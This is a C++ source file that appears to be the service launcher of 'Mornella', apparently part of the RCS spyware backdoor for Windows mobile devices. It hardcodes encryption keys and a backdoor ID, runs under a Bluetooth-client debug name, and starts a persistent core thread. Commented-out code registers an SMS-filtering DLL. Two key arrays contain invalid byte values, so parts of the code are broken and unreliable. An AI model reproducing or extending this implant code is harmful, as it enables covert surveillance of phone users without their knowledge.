////#include "pch.h"
extern "C" int mornellaStart(void);

///#include <windows.h>
#include "Core.h"

#include <thread>
#include <chrono>


#include <stdio.h>
#include <common_new\service.h>

#include "FunctionFunc.h"



// Keep track of the service status
DWORD g_dwServiceState;

// Global critical section
CRITICAL_SECTION g_cs;

// Handle to the worker thread
HANDLE g_hThread;

// Core Procedure
extern "C" DWORD WINAPI CoreProc(LPVOID lpv);

// Use CE's built-in debugging framework.
#ifdef _DEBUG

DBGPARAM dpCurSettings = {
	TEXT("bthclient"), {
		TEXT("Error"),TEXT("Init"),TEXT("Net Client"),TEXT("Interface"),
			TEXT("API"),TEXT(""),TEXT(""),TEXT(""),
			TEXT(""),TEXT(""),TEXT(""),TEXT(""),
			TEXT(""),TEXT(""),TEXT(""),TEXT("") },
			0x0007  // Turn on Error, Init, and Client DEBUGZONE's by default
};

#define ZONE_ERROR  DEBUGZONE(0)
#define ZONE_INIT   DEBUGZONE(1)
#define ZONE_CLIENT DEBUGZONE(2)
#define ZONE_INTRF  DEBUGZONE(3)
#define ZONE_API    DEBUGZONE(4)
#define ZONE_NET    DEBUGZONE(5)
#endif

extern "C" DWORD WINAPI CoreProc(LPVOID pParam) {
	MEMORY_BASIC_INFORMATION mbi;
	static INT dummy_info;
	HMODULE hSmsFilter = NULL;
	typedef HRESULT (*pRegister)();
	Core *core = NULL;



	// configurazione artificialee
	
					  
	BYTE LogKey[] = { 0x8f, 0xd1, 0x17, 0x03, 0x52, 0x96, 0x71, 0xf7, 0xf8, 0x43, 0xe6, 0x5e, 0xde, 0x33, 0xb1, 0x75d };					  
	BYTE ConfKey[] = { 0x45, 0x1e, 0x33, 0x6c, 0x97, 0x8e, 0x71, 0x7b, 0x0c, 0x38, 0x9b, 0x2c, 0x2b, 0x66, 0x75, 0x04 };					  
	BYTE ProtoKey[] = { 0x49, 0x8c, 0xe4, 0xd4, 0x31, 0xd7, 0x69, 0x8d, 0x6d, 0xa7, 0x6e, 0x87, 0xdc, 0x50, 0x13, 0xfcb };

	//g_hInstance = hInstance;

	// Configurazione artificiale di alcune variabili
	ZeroMemory(g_AesKey, 32);
	ZeroMemory(g_Challenge, 32);
	ZeroMemory(g_ConfKey, 32);

	ZeroMemory(g_BackdoorID, 16);
	ZeroMemory(g_ConfName, 32 * sizeof(WCHAR));

	CopyMemory(g_AesKey, LogKey, 16);
	CopyMemory(g_Challenge, ProtoKey, 16);
	CopyMemory(g_ConfKey, ConfKey, 16);
	CopyMemory(g_BackdoorID, "RCS_0000000033", strlen("RCS_0000000xxx"));
	CopyMemory(g_ConfName, L"c.bin", WideLen(L"c.bin"));
	// Fine configurazione artificiale









	// Installiamo la DLL
	pRegister RegisterFunction;

	ADDDEMOMESSAGE(L"SMS Filter... ");
/***
	// Registriamo la DLL per il filtering degli SMS
	hSmsFilter = LoadLibraryExW(L"SmsFilter.dll",NULL,0);

	if (hSmsFilter != NULL) {
		RegisterFunction = (pRegister)GetProcAddress(hSmsFilter, (LPCSTR)L"DllRegisterServer");

		if(RegisterFunction != NULL) {
			RegisterFunction();
		}

		FreeLibrary(hSmsFilter);

		ADDDEMOMESSAGE(L"OK\n");
	} else {
		ADDDEMOMESSAGE(L"Failed\n");
	}
***/
	//

	// Sporco trick per ottenere l'HMODULE della nostra DLL dal momento
	// che la DllMain() non viene mai chiamata se veniamo caricati come
	// servizio.
	VirtualQuery(&dummy_info, &mbi, sizeof(mbi));
	g_hInstance = reinterpret_cast<HMODULE>(mbi.AllocationBase);

	core = new(std::nothrow) Core();

	if (core == NULL)
		return 0;

	core->Run();
	
	delete core;
	return 1;
}

BOOL BTC_Init(DWORD dwData) {
	//DEBUGMSG(ZONE_INTRF,(L"Mornella: BTC_Init(0x%08x)\r\n", dwData));
	///EnterCriticalSection(&g_cs);

	g_hThread = _CreateThread(0, 0, CoreProc, 0, 0, 0);

	if (g_dwServiceState != SERVICE_STATE_UNINITIALIZED) {
		// Someone is trying to load multiple times (for example, trying to create "BTC1:").
		//DEBUGMSG(ZONE_ERROR, (L"Mornella: ERROR: BTC service already initialized\r\n"));
		///LeaveCriticalSection(&g_cs);
		return FALSE;
	}

	g_dwServiceState = SERVICE_STATE_STARTING_UP; 

	//DEBUGMSG(ZONE_INIT,(L"Mornella: BTC_Init success - service is in starting up state\r\n"));
	///LeaveCriticalSection(&g_cs);

	return TRUE;
}

BOOL BTC_Deinit(DWORD dwData) {

	DBG_MSG(L"BTC_Deinit");
	//DEBUGMSG(ZONE_INTRF,(L"Mornella: BTC_DeInit(0x%08x)\r\n", dwData));

	///EnterCriticalSection(&g_cs);
	g_dwServiceState = SERVICE_STATE_UNLOADING;

	if (g_hThread) {
		//DEBUGMSG(ZONE_INIT,(L"Mornella: Waiting for worker thread to complete before service shutdown\r\n"));
		HANDLE hWorker = g_hThread;
		///LeaveCriticalSection (&g_cs);

		// Block until the worker is through running.
		_WaitForSingleObject(hWorker, INFINITE);
	} else {
		///LeaveCriticalSection(&g_cs);          
	}

	// Service is unloaded no matter what is returned.
	//DEBUGMSG(ZONE_INIT,(L"Mornella: Completed shutdown.  Returning to services.exe for unload\r\n"));

	return TRUE;
}












int mornellaStart(void)
{
	/*
		Windows::Foundation::TimeSpan span;
		span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
	 
		Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
		vibr->Vibrate(span);
	*/
		

		BTC_Init(0x0);

		for (;;) std::this_thread::sleep_for(std::chrono::milliseconds(20000));

		return 0;
	
}